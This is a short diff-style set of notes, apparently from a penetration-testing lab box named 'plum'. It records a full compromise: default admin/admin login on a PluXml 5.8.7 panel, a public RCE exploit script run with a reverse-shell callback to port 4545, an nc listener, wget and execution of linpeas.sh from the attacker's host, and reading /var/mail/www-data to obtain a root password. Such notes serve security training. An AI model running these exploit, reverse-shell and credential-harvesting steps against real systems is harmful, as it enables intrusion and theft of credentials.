@@ -1,0 +1,25 @@
+plum
+
+192.168.171.28
+http://192.168.171.28/core/admin/
+default login admin admin
+
+PluXml 5.8.7
+https://github.com/erlaplante/pluxml-rce/blob/main/pluxml.py
+python3 pluxml.py http://192.168.171.28 admin admin 192.168.45.173 4545
+nc -nvlp 4545
+
+got shell
+
+
+ wget http://192.168.45.173:444/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+
+
+ 272394      8 -rw-rw----   1 www-data mail         4545 Sep 20 00:48 /var/mail/www-data   
+ cat /var/mail/www-data  
+ 
+ got root password in emails
+ 
